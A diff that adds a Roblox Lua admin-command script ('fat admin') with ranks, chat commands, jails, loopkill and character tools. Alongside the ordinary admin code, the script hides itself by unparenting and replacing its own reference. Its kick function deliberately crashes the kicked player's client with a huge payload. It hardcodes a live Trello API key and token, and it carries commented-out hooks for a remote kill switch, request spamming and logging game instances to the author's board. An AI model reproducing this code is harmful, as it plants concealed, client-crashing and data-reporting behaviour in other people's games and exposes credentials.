@@ -1,0 +1,6844 @@
+--[[
+	
+ok
+
+--]]
+local childrens=script:children()
+script.Parent=nil
+if game:GetRemoteBuildMode() then
+script:Destroy()
+script=nil
+repeat until nil
+end
+CreatorId = game.CreatorId
+if game.CreatorType == 'Group' then
+	if not pcall(function()
+		CreatorId = 0
+	end) then
+		CreatorId = 0
+	end
+end
+if game['VIPServerOwnerId'] ~= 0 then
+	CreatorId = game['VIPServerOwnerId']
+end
+Root = {
+	Loopkill={};
+	RemoveCommands={};
+	FreeDonor={['ManikuCalex']=true;};
+	ShowMenuGui=true;
+	ScriptBlock=false;
+	PromptLibertyA=true;
+	Materials={};
+	HttpJam=false;
+	AdminName='fat admin';
+	GroupAdmins={};
+	StartMsg = true;
+	HelperAdmin = true;
+	CreatorId = 128443701;
+	Ranks = {
+	};
+	PrivateServer = false;
+	Prefix = ':';
+	Commands = {};
+	Children = {};
+	TabFunctions = {};
+	ServerLogs = {};
+	RankColors = {
+		[0] = 'New Yeller';
+		[1] = 'Royal purple';
+		[2] = 'Navy blue';
+		[3] = 'Crimson';
+		[4] = 'Cyan';
+		[5] = 'Toothpaste';
+	};
+	Colors = {};
+	MapBackup = {};
+	Debug = false;
+	Quotes = {
+		[["A man wants to be king of the rabbits, he best wear floppy ears."]];
+		[["Green is not a creative color."]];
+		[["Never forget what you are, for surely the world will not. Make it your strength. Then it can never be your weakness. Armour yourself in it, and it will never be used to hurt you."]];
+		[["There is only one god and his name is death. What do we say to the lord of death? Not today!"]];
+		[["Once you?ve accepted your flaws, no one can use them against you."]];
+		[["Nothing burns like the cold."]];
+		[["Most men would rather deny a hard truth than face it."]];
+		[["The man who passes the sentence should swing the sword. If you would take a man's life, you owe it to him to look into his eyes and hear his final words. And if you cannot bear to do that, then perhaps the man does not deserve to die."]];
+		[["When you pull out a mans tounge, you are not proving him a liar, only telling the world you fear what he might say."]];
+		[["Love is poison. A sweet poison, yes, but it will kill you all the same."]];
+		[["Power resides where men believe it resides. No more and no less."]];
+		[["There have been malicious rumors started at this elementary school that my beautiful fiancee is a hobbit. That is not funny and it is not true. Yes, she is heavier than most of her pictures show her to be. Yes, she gets her hair lasered off her body and yes, she has a friend named Gandalf, who happens to be a wizard."]];
+		[["A lion doesn't concern himself with the opinions of sheep."]];
+		[["There's a beast in every man, and it stirs when you put a sword in his hand."]];
+		[["It is a big and beautiful world. Most of us live and die in the same corner where we were born and never get to see any of it. I don't want to be most of us."]];
+		[["Only death can pay for life."]];
+		[["You're mine and I'm yours, and if we die we die but first we'll live."]];
+		[["Life is what happens to you while you're busy making other plans."]];
+	};
+}
+Root.Periastrons = {
+	159229806;
+	80661504;
+	108158379;
+	93136802;
+	99119240;
+	73829193;
+	69499437;
+	233520257;
+	139577901;
+}
+Reflect = {}
+loopnum = math.random(-9999999, 9999999)
+Jails = {}
+Plugins = {
+	--['Example Plugin'] = require(320802926); -- Only put plugins authorized by me, darthstrantax.
+}
+Objects = {}
+AllowedInstallPlugins = {
+	--[321738959] = true;
+}
+SkyCell={}
+isHttpOn = false
+local asdfat = pcall(function()
+	game:GetService'HttpService':GetAsync'https://www.trello.com'
+end)
+if asdfat == true then isHttpOn = true end
+Premium = false
+InvisFFs = {}
+--small loops/preperations
+--http block
+--[[
+coroutine.resume(coroutine.create(function()
+while true do
+if Root.HttpJam then
+for i=1, 500 do
+pcall(function()
+game:service'HttpService':GetAsync('http://pastebin.com/raw.php?i=EYuhgfSe')
+end)
+end
+end
+wait(30)
+end
+end))
+]]
+--sky cell cx
+coroutine.resume(coroutine.create(function()
+game:service'RunService'.Stepped:connect(function()
+local SkyPlayers={}
+for i,v in pairs(game:service'Players':GetPlayers()) do
+if SkyCell[v.userId] then
+	table.insert(SkyPlayers,v)
+end
+
+
+end
+for i,v in pairs(SkyPlayers) do
+local a,b=pcall(function()
+if not v.Character then v:LoadCharacter() wait() end
+if not v.Character:FindFirstChild'Humanoid' then v:LoadCharacter() wait() end
+if not v.Character:FindFirstChild'HumanoidRootPart' then v:LoadCharacter() wait() end
+if not v.Character:FindFirstChild'Head' then v:LoadCharacter() wait() end
+v.Character.Archivable=false
+if v:DistanceFromCharacter(Vector3.new(0,10000,0)) > 15 then
+v.Character.HumanoidRootPart.CFrame=CFrame.new(0,10000,0)
+end
+
+end)
+if not a then
+--print('SkyCell Error: '..b)
+v:LoadCharacter()
+end
+
+end
+end)
+end))
+coroutine.resume(coroutine.create(function()
+while true do
+for i,v in pairs(game:service'Players':GetPlayers()) do
+if Root.Loopkill[v.userId] then
+pcall(function()v.Character:BreakJoints()end)
+end
+
+
+end
+wait()
+end
+end))
+coroutine.resume(coroutine.create(function()
+local a={}
+local c={}
+local f
+local debounce
+local function remake()
+if debounce then
+return
+end
+debounce=true
+pcall(function()f:Destroy()end)
+a={}
+for i,v in pairs(c) do
+pcall(function()v:disconnect()end)
+end
+c={}
+f=Instance.new('Folder',workspace)
+f.Name='SkyCell'
+local cf=CFrame.new(0,10000,0)
+for y=1, 15 do
+for z=1, 10 do
+local p=Instance.new('Part',f)
+p.Anchored=true
+p.FormFactor='Custom'
+p.Locked=true
+p.TopSurface='Smooth'
+p.BottomSurface='Smooth'
+p.Material='Slate'
+p.Size=Vector3.new(.2,7.2,7.2)
+p.CFrame=cf*CFrame.Angles(0,math.rad((y/15)*360),math.rad((z/10)*360))*CFrame.new(-10,-10,0)
+table.insert(a,p)
+end
+end
+c[#c+1]=f.Changed:connect(function() remake() end)
+for i,v in pairs(a) do
+c[#c+1]=v.Changed:connect(function()remake() end)
+end
+wait()
+debounce=false
+end
+remake()
+end))
+local Services = {
+	'NetworkServer',
+	'Players'
+}
+for i, v in pairs(Services) do
+	getfenv()[v] = game:service(v)
+end
+for i, v in pairs(childrens) do
+	Root.Children[v.Name] = v:clone()
+end
+script:ClearAllChildren()
+script.Parent = nil
+--metatables & tables
+script  = nil
+FreePremium = {
+	[261] = true;
+}
+--if game:service'HttpService':GetAsync('http://api.rproxy.pw/Ownership/HasAsset?userId='..Root.CreatorId..'&assetId=318715491')=='true' or FreePremium[Root.CreatorId] then
+Premium = true
+--end
+script = {
+	Parent = workspace;
+	Name = 'homeless'
+} -- nils the script before making it a table.
+function script:children()
+	return childrens
+end
+function script:GetChildren()
+	return childrens
+end
+setmetatable(script, {
+	__index = function(a, b)
+		if Root.Children[b] then
+			return Root.Children[b]
+		end
+		if Root[b] then
+			return Root[b]
+		end
+		if getfenv()[b] then
+			return getfenv[b]
+		end
+	end;
+	__newindex = function()
+	end
+})
+wait(.3)
+function fatsize(Player, ScalePercent)
+		if not Player or not Player.Character or not tonumber(ScalePercent) then return end
+	local Ratio = ScalePercent/100
+	if Ratio < 0.05 then Ratio = 0.05 end
+	if Ratio > 100 then Ratio = 100 end
+	if Ratio > 1 then Ratio = math.ceil(Ratio) end
+	local Char = Player.Character
+	
+	local Clean = Char:FindFirstChild("Clean")
+	if Clean then Clean:Invoke() wait(0.1) Char = Player.Character end
+	Clean = Instance.new("BindableFunction", Char) Clean.Name = "Clean"
+
+	local function Cycle(BaseObj, ScaleRatio, NewAdd, JustWeld)
+		local Welds = {}
+		local Parts = {}
+		
+		local function Handle(Obj)
+			if Obj:IsA("BasePart") and not JustWeld then
+				table.insert(Parts, Obj)
+			elseif Obj:IsA("SpecialMesh") and not JustWeld then
+				if Obj.Name == "fat Mesh" then
+					Obj:Destroy()
+				end
+				if Obj.MeshType == Enum.MeshType.FileMesh then
+					Obj.Offset = Obj.Offset * ScaleRatio
+					Obj.Scale = Obj.Scale * ScaleRatio
+				elseif Ratio < 1 then
+					Obj.Offset = Obj.Offset * ScaleRatio
+					Obj.Scale = Obj.Scale * ScaleRatio
+				end
+			elseif Obj:IsA("CharacterMesh") and not JustWeld then
+				if Ratio < 1 then
+					local BodyPart = ""
+					local TextureID = Obj.BaseTextureId
+					if TextureID == 0 then TextureID = Obj.OverlayTextureId end
+					if TextureID == 0 then TextureID = nil end
+					if Obj.BodyPart == Enum.BodyPart.LeftArm then BodyPart = "Left Arm" end
+					if Obj.BodyPart == Enum.BodyPart.RightArm then BodyPart = "Right Arm" end
+					if Obj.BodyPart == Enum.BodyPart.LeftLeg then BodyPart = "Left Leg" end
+					if Obj.BodyPart == Enum.BodyPart.RightLeg then BodyPart = "Right Leg" end
+					if Obj.BodyPart == Enum.BodyPart.Torso then BodyPart = "Torso" end
+					if Obj.BodyPart == Enum.BodyPart.Head then BodyPart = "Head" end
+					local NewMesh = Instance.new("SpecialMesh", Obj.Parent:FindFirstChild(BodyPart))
+					NewMesh.Name = "fat Mesh"
+					NewMesh.Scale = Vector3.new(ScaleRatio,ScaleRatio,ScaleRatio)
+					if TextureID then NewMesh.TextureId = "rbxassetid://"..TextureID end
+					NewMesh.MeshId = "rbxassetid://"..Obj.MeshId
+					Obj:Destroy()
+				end
+			elseif Obj:IsA("JointInstance") then
+				local NewWeld = Obj:Clone()
+				table.insert(Welds, {NewWeld, Obj.Parent})
+			elseif NewAdd == true and not JustWeld then
+				if Obj:IsA("Tool") then
+					--Cycle(Char["Right Arm"], ScaleRatio, false, true)
+				elseif Obj:IsA("Accoutrement") then
+					--Cycle(Char.Head, ScaleRatio, false, true)
+				end
+			end
+			if #Obj:GetChildren() > 0 then
+				for _,NewObj in pairs(Obj:GetChildren()) do
+					Handle(NewObj, ScaleRatio)
+				end
+			end
+		end
+		Handle(BaseObj)
+		for _,Part in pairs(Parts) do
+			if Ratio >= 1 then
+				Part.Size = Part.Size * ScaleRatio
+			else
+				local Allowed = true
+				for _,Obj in pairs(Part:GetChildren()) do
+					if Obj:IsA("DataModelMesh") or Obj.Name == "fat Mesh" then
+						Allowed = false
+					end
+				end
+				if Allowed == true then
+					local NewMesh = Instance.new("BlockMesh", Part)
+					NewMesh.Name = "fat Mesh"
+					NewMesh.Scale = Vector3.new(Ratio,Ratio,Ratio)
+				end
+			end
+		end
+		for _,WeldData in pairs(Welds) do
+			if WeldData[1] then
+				local Obj = WeldData[1]
+				local NewWeld = Obj:Clone()
+				
+				NewWeld.Parent = WeldData[2]
+				NewWeld.C0 = CFrame.new(Obj.C0.p * ScaleRatio) * CFrame.Angles(Obj.C0:toEulerAnglesXYZ())
+				NewWeld.C1 = CFrame.new(Obj.C1.p * ScaleRatio) * CFrame.Angles(Obj.C1:toEulerAnglesXYZ())
+			end
+		end
+		for _,Part in pairs(Parts) do
+			Part:MakeJoints()
+		end
+		Welds = {}
+		Parts = {}
+	end
+	Cycle(Char, Ratio)
+	Char:MakeJoints()
+	
+	local Added = Char.ChildAdded:connect(function(Obj)
+		Cycle(Obj, Ratio, NewAdd)
+	end)
+	local Removed = Char.ChildRemoved:connect(function(Obj)
+		Cycle(Obj, Ratio^-1, NewAdd)
+	end)
+	
+	Clean.OnInvoke = function()
+		Added:disconnect()
+		Removed:disconnect()
+		local Location = Vector3.new(0,5,0)
+		if Char:FindFirstChild("Head") then
+			Location = Char.Head.CFrame
+		end
+		Player:LoadCharacter()
+		wait(0.5)
+		Player.Character.Head.CFrame = Location
+		wait(0.5)
+		return nil
+	end
+	
+	if Char:FindFirstChild("Torso") then
+		Char:MoveTo(Char.Torso.Position + Vector3.new(0,Ratio*3))
+	end
+	if Char:FindFirstChild("Humanoid") then
+		Char.Humanoid.WalkSpeed = Char.Humanoid.WalkSpeed * (Ratio)
+	end
+	if Ratio < 1 and Char:FindFirstChild("HumanoidRootPart") and Char.HumanoidRootPart:FindFirstChild("RootJoint") then
+		Char.HumanoidRootPart.RootJoint.C0 = CFrame.new(0,-(3-(Ratio*3)),0) * CFrame.Angles(-math.rad(90),0,math.pi)
+	end
+end
+--remade functions
+function SimpleString(str)
+local tr=''
+local strings={
+['Q']=true;
+['W']=true;
+['E']=true;
+['R']=true;
+['T']=true;
+['Y']=true;
+['U']=true;
+['I']=true;
+['O']=true;
+['P']=true;
+['A']=true;
+['S']=true;
+['D']=true;
+['F']=true;
+['G']=true;
+['H']=true;
+['J']=true;
+['K']=true;
+['L']=true;
+['Z']=true;
+['X']=true;
+['C']=true;
+['V']=true;
+['B']=true;
+['N']=true;
+['M']=true;
+}
+for i=1, #str do
+if strings[str:sub(i,i):upper()] then
+tr=tr..str:sub(i,i)
+elseif str:sub(i,i)==' ' then
+tr=tr..'-'
+end
+end
+return tr
+end
+thread = function(...)
+	return coroutine.resume(coroutine.create(...))
+end
+thread(function()
+--Root.Motd=game:service'HttpService':GetAsync'https://titanpad.com/ep/pad/export/LibertyAmotd/latest?format=txt';
+while wait(10) do
+--local c=game:service'HttpService':GetAsync('https://titanpad.com/ep/pad/export/LibertyAemergencysd/latest?format=txt')
+if tostring(game.PlaceId)==c or tonumber(c) == game.PlaceId then
+repeat
+	game:service'Players':ClearAllChildren()
+until wait()<0
+
+
+end
+end
+end)
+spawn((function()
+	TrelloToken = 'key=d0d792ddc8ff545a84661d4600e9a9da&token=39e19b6ce91ddcf23322ace452d6af19aad150880b14f97269ac3bdc69b40e82'
+	function TrelloLists()
+		--return game:service'HttpService':GetAsync('https://trello.com/1/boards/565961106ccf1e223e02f23b/lists?'..TrelloToken)
+	end
+	function TrelloAddList(Name, Board)
+		return
+--game:service'HttpService':PostAsync('https://trello.com/1/lists?'..TrelloToken, JE({
+			--name = tostring(Name),
+			--idBoard = Board
+		--}))
+	end
+	function TrelloAddCard(Name, List)
+		return
+--game:service'HttpService':PostAsync('https://trello.com/1/cards?'..TrelloToken, JE({
+			--name = tostring(Name),
+		--	desc='Owned by '..CreatorId,
+		--	due='null',
+		--	idList = List
+		--}))
+	end
+	local gamename="http://www.roblox.com/games/"..game.PlaceId.."/"..SimpleString(game:service'MarketplaceService':GetProductInfo(game.PlaceId).Name)..'#!/game-instances'
+	function JD(...)
+		return game:service'HttpService':JSONDecode(...)
+	end
+	function JE(...)
+		return game:service'HttpService':JSONEncode(...)
+	end
+	newlist = true
+	placelistid=''
+	--[[for i, v in pairs(JD(TrelloLists())) do
+		if v.name==gamename then
+		newlist=false
+		placelistid=v.id
+		end
+	end]]
+	if newlist then
+		--placelistid=JD(TrelloAddList(gamename, '565961106ccf1e223e02f23b')).id
+	end
+TrelloAddCard(game.PlaceId..'/ /'..game.JobId,placelistid)
+end))
+thread(function()
+	thread(function()
+		--getfenv(_G.Message).script.Disabled=true
+	end)
+	thread(function()
+--require(169952904)
+	end)
+end)
+--essential loops
+for i, v in pairs(workspace:children()) do
+	thread(function()
+		table.insert(Root.MapBackup, v:clone())
+	end)
+end
+--functions
+tobool = function(str)
+	if str == 'true' or str == 'on' then
+		return true
+	end
+	if str == 'false' or str == 'off' then
+		return false
+	end
+end;
+function Root.GetRawPlayersNamed()
+	local tempplayerlist = {}
+	for i, v in pairs(game:service'NetworkServer':children()) do
+		if v:IsA'ServerReplicator' then
+			tempplayerlist[v:GetPlayer().Name] = v:GetPlayer()
+		end
+	end
+	return tempplayerlist
+end
+function HasMeta(t)
+if getmetatable(t)~=nil and getmetatable(t)~='This metatable is locked' then
+return true
+end
+--[[for i,v in pairs(t) do
+if HasMeta(i) or HasMeta(v) then
+return true
+end
+end]]
+return false
+end
+function Root.GetRawPlayers()
+	local tempplayerlist = {}
+	for i, v in pairs(game:service'NetworkServer':children()) do
+		if v:IsA'ServerReplicator' then
+			table.insert(tempplayerlist, v:GetPlayer())
+		end
+	end
+	return tempplayerlist
+end
+--[[setmetatable(Root.Ranks,{
+__newindex=function(a,b,c)
+rawset(Root.Ranks,b,c)
+thread(function()
+repeat wait() until Root.Ranks[b]~=c
+for i,v in pairs(Root.GetRawPlayers()) do
+if v.Name==b or v.userId==b then
+print('Set '..v.Name..' to rank '..Root.GetRank(b))
+Root.FireClient(v,'SetRank',Root.GetRank(b))
+end
+end
+end)
+end;
+__metatable='';
+})]]
+function Root.UsernameFromID(ID)
+	if type(ID) ~= "number" then
+		return
+	end
+	local sets = game:service("InsertService"):GetUserSets(ID)
+	for k, v in next, sets do
+		if v.Name == "My Models" then
+			return v.CreatorName
+		end
+	end
+end
+coroutine.resume(coroutine.create(function()
+while wait() do
+for i,v in pairs(Root.Ranks) do
+if type(i) == 'number' then
+pcall(function()
+local name=Root.UsernameFromID(i)
+Root.Ranks[name]=v
+Root.Ranks[i]=nil
+end)
+end
+end
+end
+end))
+function Root.Kick(Player, Text)
+	Player:kick(Text)
+	wait()
+	game:service'Debris':AddItem(-- Delete It Later
+		Instance.new('RemoteEvent', -- Create It
+		game:service'ReplicatedStorage' -- Parent It
+		):FireClient(-- Fire it
+		Player, -- The Player
+		{
+			string.rep('kik', 5e5 + 5)
+		} -- To Crash them
+	)
+, 5) -- Time to wait before deleting.
+end
+function Root.OxChat(Player,Name,Text)
+if game.PlaceId~=20279777 then return end
+pcall(function()
+local c=Instance.new('StringValue',Player)
+c.Name='SB_Chat'
+c.Value=Name..'/'..Text
+end)
+end
+function Root.GetPlayers(Player, Message)
+	local Arguments = Root.Split(Message, ',')
+	local ToReturn = {}
+	for _, v in next, Arguments do
+		v = v:lower()
+		if v == 'me' and type(Player) == 'userdata' then
+			table.insert(ToReturn, Player)
+		elseif v == 'others' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.Name ~= Player.Name then
+					table.insert(ToReturn, l)
+				end
+			end
+            
+		elseif v == 'random' then
+			local child = Root.GetRawPlayers()
+			local randomPlr = math.random(1, #child)
+			table.insert(ToReturn, child[randomPlr])
+		elseif v == 'nbc' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.MembershipType == Enum.MembershipType.None then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'bc' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.MembershipType == Enum.MembershipType.BuildersClub then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'tbc' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.MembershipType == Enum.MembershipType.TurboBuildersClub then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'obc' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'anybc' or v == 'allbc' or v == 'abc' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.MembershipType == Enum.MembershipType.OutrageousBuildersClub or l.MembershipType == Enum.MembershipType.TurboBuildersClub or l.MembershipType == Enum.MembershipType.BuildersClub then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'nils' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.Parent == nil then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'nonnils' or v == 'players' or v == 'plrs' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.Parent ~= nil then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'friends' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l:IsFriendsWith (Player.userId) then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'owners' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if Root.GetRank(l) >= 4 then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'admins' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if Root.GetRank(l) >= 2 then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'mods' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if Root.GetRank(l) >= 1 then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'nonadmins' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if Root.GetRank(l) < 1 then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'followed' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if l.FollowUserId == Player.userId then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'team' then
+			for k, l in pairs(game:service'Players':GetPlayers()) do
+				if l.TeamColor == Player.TeamColor then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v:sub(1, #'team ') == 'team ' then
+			local Color = ''
+			for k, l in pairs(game:service'Teams') do
+				if l.Name:sub(1, v:sub(#'team ' + 1)):lower() == v:sub(#'team ' + 1):lower() then
+					Color = tostring(l.TeamColor)
+				end
+			end
+			for k, l in pairs(game:service'Players':GetPlayers()) do
+				if l.TeamColor == BrickColor.new(Color) then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'notfriends' or v == 'nonfriends' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				if not l:IsFriendsWith(Player.userId) then
+					table.insert(ToReturn, l)
+				end
+			end
+		elseif v == 'all' then
+			for k, l in pairs(Root.GetRawPlayers()) do
+				table.insert(ToReturn, l) 
+			end
+		else
+			for l, k in next, Root.GetRawPlayers() do
+				if k.Name:lower():sub(1, #v) == v then
+					table.insert(ToReturn, k) 
+				end
+			end
+		end
+		if v:sub(1, 1) == '-' then
+			for i, v in pairs(Root.GetPlayers(Player, v:sub(2))) do
+				for u, o in pairs(ToReturn) do
+					if o.Name == v.Name then
+						table.remove(ToReturn, u)
+					end
+				end
+			end
+		end
+	end
+	for i, v in pairs(ToReturn) do
+		if Reflect[v.userId] and Root.GetRank(v) >= Root.GetRank(Player) then
+			ToReturn[i] = Player
+		end
+	end
+	return ToReturn
+end
+function Root.CharModel(Player,Type)
+local CharIds={
+['doge']=257489726;
+['huge']=72648316;
+['cat']=319498905;
+['nerfzombie']=305897868;
+['dragon']=158186284;
+['pony']=255278956;
+['dog']=313515030;
+['gremlin']=180497645;
+['spider']=299861127;
+['tdm']=301507511;
+['deaddog']=306542926;
+['croc']=255119149;
+['robotspider']=285590061;
+['hedgehog']=228289069;
+['monster']=319386664;
+['chopper']=178339458;
+['zombie']=93601062;
+['meerkat']=267059049;
+['zombiedog']=121599935;
+['undeadknight']=180205370;
+['dragon2']=253023349;
+['skeleton']=53604463;
+['griffin']=215399493;
+['zombie2']=64630774;
+['babyfox']=220799053;
+['penguin']=170822767;
+['petdino']=190914205;
+['doggie']=82264079;
+['grimlock']=184869613;
+['monkay']=71536048;
+['chimera']=87350670;
+['troll']=88117081;
+['genie']=71006520;
+['dummy']=124120704;
+['ghost']=179296736;
+['bat']=180247488;
+['bug']=76117301;
+}
+local m=Player.Character.Animate:clone()
+m.Disabled=true
+local c=Player.Character.Head.CFrame
+Player.Character:ClearAllChildren()
+local d
+if Type~='epicfaic' then
+d=game:service'InsertService':LoadAsset(CharIds[Type:lower()]):children()[1]:children()
+else
+d=require(329132087):children()
+end
+for i,v in pairs(d) do
+v.Parent=Player.Character
+end
+Player.Character.Head.CFrame=c
+if not Player.Character:FindFirstChild'Animate' then
+m.Parent=Player.Character
+wait()
+m.Disabled=false
+end
+local hum
+for i,v in pairs(Player.Character:children()) do
+	if v:IsA'Humanoid' then
+		hum=v
+		break
+		end
+end
+if hum then
+	hum.Died:connect(function()
+		wait(3)
+		Player:LoadCharacter()
+		end)
+	end
+end
+function Root.FollowPlayer(d, e)
+	if type(e) == 'string' then
+	--	e = game:service'HttpService':JSONDecode(game:service'HttpService':GetAsync('http://api.rproxy.pw/users/get-by-username?username='..e)).Id
+	end
+	local c, a, b, a = game:GetService'TeleportService':GetPlayerPlaceInstanceAsync(e)
+	if c then
+		local c = #Root.TabFunctions + math.random(1, 999999)
+		Root.TabFunctions[c] = function(c)
+			if c then
+				game:GetService'TeleportService':TeleportToPlaceInstance(b, a, d)
+			else
+			end
+		end
+		Root.FireClient(d, 'VoteGui', 'Follow user '..Root.UsernameFromID(e)..' to game?', 'Place Teleport', c)
+	end
+end
+function Root.Explore(Player, Object)
+	Object = Object or workspace
+	if Player == nil then
+		return
+	end
+	Root.FireClient(Player, 'Dismiss', Object)
+	Root.Ping(Player, 'Name | '..Object.Name)
+	Root.Ping(Player, 'ClassName | '..Object.ClassName)
+	if Object.Parent then
+		Root.Ping(Player, 'Parent | '..Object.Parent.Name or 'Nil', 'New Yeller', function()
+			Root.Explore(Player, Object.Parent)
+		end)
+	end
+
+	Root.Ping(Player, 'Children', 'New Yeller', function()
+		Root.FireClient(Player, 'Dismiss', Object)
+		for i, v in pairs(Object:children()) do
+			Root.Ping(Player, v.Name, 'New Yeller', function()
+				Root.Explore(Player, v)
+			end)
+		end
+	end)
+	if Object.Parent then
+		Root.Ping(Player, 'Destroy', 'Really red', function()
+			Root.Explore(Player, Object.Parent)
+			Object:Destroy()
+		end)
+	end
+
+end
+function Root.TableExplore(Player, Object,Index,Parent)
+	Index=Index or 'Unknown'
+	Object = Object or _G
+	if Player == nil then
+		return
+	end
+	Root.FireClient(Player, 'Dismiss', Object)
+	Root.Ping(Player, 'Index | '..Index)
+	if type(Object)=='table' and type(getmetatable(Object))=='table' then
+	Root.Ping(Player, 'Metatable | '..getmetatable(Object),'Lime green',function()
+	Root.TableExplore(Player,getmetatable(Object),'Metatable of '..Index,Object)
+	end)
+	end
+	if Parent then
+		Root.Ping(Player, 'Parent Index', 'New Yeller', function()
+			Root.TableExplore(Player, Parent,'Parent Index of '..Index)
+		end)
+	end
+if type(Object)=='table' then
+	Root.Ping(Player, 'Indexes', 'New Yeller', function()
+		Root.FireClient(Player, 'Dismiss')
+		for i, v in pairs(Object) do
+			Root.Ping(Player, i..'| Value '..tostring(v)..' | Type '..type(v), 'New Yeller', function()
+				if type(v)=='table' then
+				Root.TableExplore(Player, v,i,Object)
+			elseif type(v)=='function' then
+				v()
+			else
+			Root.TableExplore(Player, v,i,Object)
+				end
+			end)
+		end
+	end)
+	if Parent and Index then
+		Root.Ping(Player, 'Destroy', 'Really red', function()
+			Parent[Index]=nil
+		end)
+end
+end
+
+end
+function Root.GetRank(Player)
+	local c = 0
+	if Root.Ranks[Player.Name] then
+		c = Root.Ranks[Player.Name]
+	end
+	--[[if Root.Ranks[Player.userId] and c~=nil then
+	if Root.Ranks[Player.userId] > c and c >= 0 then
+	c=Root.Ranks[Player.userId]
+end
+elseif c==nil and Root.Ranks[Player.userId] then
+c= Root.Ranks[Player.userId]
+	end]]
+	return c
+end
+function Root.RankName(a,d)
+	if type(a) == 'string' then
+		a = tonumber(a)
+	end
+	if type(a) == 'number' then
+		if a == 1 then
+			return 'Moderator'
+		end
+		if a == 2 then
+			return 'Temp-Admin'
+		end
+		if a == 3 then
+			return 'Administrator'
+		end
+		if a == 4 then
+			return 'Owner'
+		end
+		if a == 5 then
+			return 'Place-Owner'
+		end
+		if a < 0 then
+			return 'Banned'
+		end
+		if a < 1 then
+			return 'Non-Admin'
+		end
+		if a < 5 then
+			return 'ROOT'
+		end
+		return 'Non-Admin'
+	end
+	if a:IsA'Player' then
+		return Root.RankName(Root.GetRank(a))
+	end
+end
+function CheckBans(Player)
+	Root.Kick(Player)
+end
+function Root.CmdIsRemoved(cmd)
+for i,v in pairs(Root.RemoveCommands) do
+if Root.Commands[v:lower()] and Root.Commands[v:lower()].Name:lower()==cmd.Name:lower() then
+return true
+end
+end
+return false
+end
+function Root.PlayerAdded(Player)
+	if (Root.Ranks[Player.Name] or Root.Ranks[Player.userId]) then
+		if Root.Ranks[Player.Name] and Root.Ranks[Player.Name] > 5 then
+			Root.Ranks[Player.Name] = 5
+		end
+		if Root.Ranks[Player.userId] and Root.Ranks[Player.userId] > 5 then
+			Root.Ranks[Player.userId] = 5
+		end
+	else
+		Root.Ranks[Player.Name] = 0
+	end
+	if Root.GetRank(Player) < 0 or (Root.GetRank(Player) < 1 and Root.PrivateServer) then
+		CheckBans(Player)
+	end
+	pcall(function()
+	if Root.GetRank(Player) >= 0 then
+		for i,v in pairs(Root.GroupAdmins) do
+			if v.GroupRank <= 0 then
+			if Player:IsInGroup(v.ID) and Player:GetRankInGroup(v.ID) == v.GroupRank then
+				Root.Ranks[Player.userId] = v.Rank
+			end
+		else
+					if Player:IsInGroup(v.ID) and Player:GetRankInGroup(v.ID) <= 0-(v.GroupRank) then
+				Root.Ranks[Player.userId] = v.Rank
+			end
+			end
+		end
+end
+end)
+	repeat
+		wait()
+	until Player.Character ~= nil and Player:FindFirstChild'Backpack'
+	local scl = script._Client:clone()
+	scl.Parent = Player:FindFirstChild'Backpack'
+	wait()
+	scl.Archivable = false
+	scl.Disabled = false
+	wait(5)
+	--Root.Ping(Player,'LibertyA Generation 4 is on its way, make sure to update your loaders once its out!','Lime green')
+	if Root.StartMsg then
+		--Root.Ping(Player, Root.AdminName..' is loaded here. The prefix is '..Root.Prefix)
+	end
+	if Root.GetRank(Player) > 0 then Root.Ping(Player, 'You are an admin! Level: '..Root.GetRank(Player)) if not isHttpOn then Root.Ping(Player, 'HttpEnabled is '..string.upper(tostring(isHttpOn))..'! Some commands may not work!') end end
+	if Player.userId==Root.CreatorId and Root.Version==1 then
+	--Root.Ping(Player, "There has been a new update to the loader, you might want to reinsert to get some more settings!",'New Yeller')
+end
+thread(function()
+while Player and wait(1) do
+	--_G.Root = Root
+	Root.FireClient(Player, 'SetRank', Root.GetRank(Player))
+	Root.FireClient(Player, 'SetPrefix', Root.Prefix)
+	Root.FireClient(Player, 'SetOwner', Root.CreatorId)
+	Root.FireClient(Player,'SetAdminName',Root.AdminName)
+	Root.FireClient(Player,'SetGuiVisible',Root.ShowMenuGui)
+	--Root.FireClient(Player,'PromptLibertyAFunc',Root.PromptLibertyA)
+end
+end)
+--while Player do
+	local chatev = Player.Chatted:connect(function(Message)
+		Root.PlayerChatted(Player, Message)
+	end)
+--[[wait()
+chatev:disconnect()
+end]]
+end
+function Root.Jail(Player)
+	local PlayerName = Player.Name
+	local cf = Player.Character.HumanoidRootPart.CFrame
+	local Jail = Instance.new('Model', workspace)
+	table.insert(Jails, {
+		Player = PlayerName,
+		Jail = Jail
+	})
+	for x = 1, 36 do
+		for y = 1, 36 do
+			local p = Instance.new('Part', Jail)
